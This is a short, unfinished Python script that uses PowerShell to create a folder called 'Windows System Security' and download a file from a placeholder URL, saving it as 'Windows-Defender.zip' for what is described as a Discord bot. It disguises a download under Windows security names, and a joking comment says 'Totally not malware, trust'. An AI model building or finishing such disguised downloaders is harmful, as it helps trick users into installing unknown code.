#Imports
from subprocess import run #To run commands in cmd

#Method to run commands and handle errors
def installStep(command):
    try:
        run(["powershell", command], shell=False, check=True)
    except:
        exit()

#Step 1: Create a working directory to download all of the files to
installStep("mkdir Windows System Security") #Totally not malware, trust

#Step 2: Download the application to run the Discord bot
#TODO add proper URL
installStep("curl URLHERE -o Windows-Defender.zip")

#Step 3: extract the application